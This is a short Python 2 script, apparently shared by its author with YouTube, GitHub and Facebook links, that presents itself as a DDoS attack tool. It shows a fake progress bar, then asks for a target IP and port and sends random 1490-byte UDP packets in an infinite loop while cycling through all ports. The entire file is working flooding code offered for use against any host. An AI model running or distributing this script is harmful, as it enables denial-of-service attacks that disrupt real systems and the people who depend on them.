import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "\033[1;36;48mAuthor   : HA-MRX"
print "You Tube : https://www.youtube.com/c/HA-MRX"
print "github   : https://github.com/Ha3MrX"
print "Facebook : https://www.facebook.com/muhamad.jabar222\033[1;37;0m"
print
ip = raw_input("\033[1;34;48mIP : ")
port = input("Port : \033[1;37;0m")

os.system("clear")
os.system("figlet Attack Starting")
print "\033[1;32;48m[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(2)
print "[===============     ] 75%"
time.sleep(2)
print "[====================] 100%\033[1;37;0m"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

